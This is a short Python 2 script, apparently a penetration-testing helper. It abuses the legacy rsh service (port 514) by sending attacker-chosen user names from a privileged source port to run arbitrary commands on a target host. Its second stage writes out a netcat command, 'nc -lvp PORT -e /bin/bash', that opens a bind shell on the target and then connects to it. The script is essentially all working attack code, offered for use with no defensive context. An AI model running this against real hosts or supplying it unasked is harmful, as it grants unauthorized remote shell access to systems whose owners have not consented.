#!/usr/bin/python2.7
#Rsh Module
import sys
import socket
import random
import time
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if len(sys.argv) < 5:
    print "exiting"
    print "Example ./rsh.py 10.129.121.16 foobar foobar id"

    sys.exit()
else:
    host = sys.argv[1]
    fromuser = sys.argv[2]
    username = sys.argv[3]
    command = sys.argv[4]
SEND="%s\0%s\0%s\0" % (fromuser, username, command)

startport = 600
endport = 900
myport =  random.randrange(startport, endport)

startbindport = 5000
endbindport = 6000
bindport =  random.randrange(startbindport, endbindport)

print "Using Port %s" %(myport)
s.bind(('0.0.0.0', myport))
s.connect((host,514))
s.send("\0")
s.send(SEND)
time.sleep(0.5)
test = s.recv(1024)
print test
s.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
user = raw_input('Do You Want A Bind Shell? Y/n: ')

if user =="y":
    s.bind(('0.0.0.0', myport))
    s.connect((host,514))
    command  = 'nc -lvp %s -e /bin/bash'% (bindport)
    SEND="%s\0%s\0%s\0" % (fromuser, username, command)
    s.send("\0")
    s.send(SEND)
    time.sleep(0.5)
    test = s.recv(1024)
    s.close()
    print 'Using Netcat To Connect To %s On Port %s'% (host, bindport)
    subprocess.call(["nc" , str(host), str(bindport)])
else:
    s.close()
    sys.exit()
